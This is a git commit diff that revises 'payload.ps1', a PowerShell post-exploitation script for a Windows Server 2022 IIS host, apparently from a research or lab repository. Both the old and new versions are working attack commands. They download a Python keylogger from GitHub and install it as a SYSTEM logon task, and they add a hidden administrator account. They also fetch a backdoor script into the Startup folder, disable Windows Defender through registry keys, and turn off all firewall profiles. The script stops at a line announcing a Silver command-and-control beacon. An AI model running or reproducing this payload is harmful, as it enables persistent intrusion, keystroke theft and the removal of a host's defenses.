94262060ce879b7114f6b7c1cea11aa16737807e
cleverbear57 <84736210+cleverbear57@users.noreply.github.com>
2026-03-26 23:46:32 -0700

    Update payload.ps1

--- Windows Server 2022 IIS/payload.ps1
+++ Windows Server 2022 IIS/payload.ps1
@@ -1,29 +1,25 @@
 # install python and python keylogger
-Invoke-WebRequest https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe -OutFile python-installer.exe
-Start-Process python-installer.exe -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+curl https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe -o python-installer.exe
+python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
 pip install pynput
 curl "https://github.com/cleverbear57/AI-Research-Project/raw/refs/heads/main/Windows%20Server%202022%20IIS/klogger.py" -OutFile "C:/Windows/System32/config/klogger.pyw"
-Register-ScheduledTask -TaskName "PyBgTask" `
--Action (New-ScheduledTaskAction -Execute "C:\Program Files\Python312\pythonw.exe" -Argument "C:\Windows\System32\config\klogger.pyw") `
--Trigger (New-ScheduledTaskTrigger -AtLogOn) `
--Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) `
--Force
+powershell -Command "Register-ScheduledTask -TaskName 'PyBgTask' -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Python312\pythonw.exe' -Argument 'C:\Windows\System32\config\klogger.pyw') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Force"
 
 # add malicious user
-net user john "password" /add
-Add-LocalGroupMember -Group "Administrators" -Member "john"
+net user john password /add
+net localgroup Administrators john /add
 
 # download powershell backdoor to startup folder
 curl "https://raw.githubusercontent.com/cleverbear57/AI-Research-Project/refs/heads/main/Windows%20Server%202022%20IIS/shl.ps1" -o "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shl.ps1"
 
 # disable windows defender and real-time protection
-New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord
-New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
 
 # disable all firewall profiles
-Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False
+netsh advfirewall set allprofiles state off
 
 # install silver beacon
 
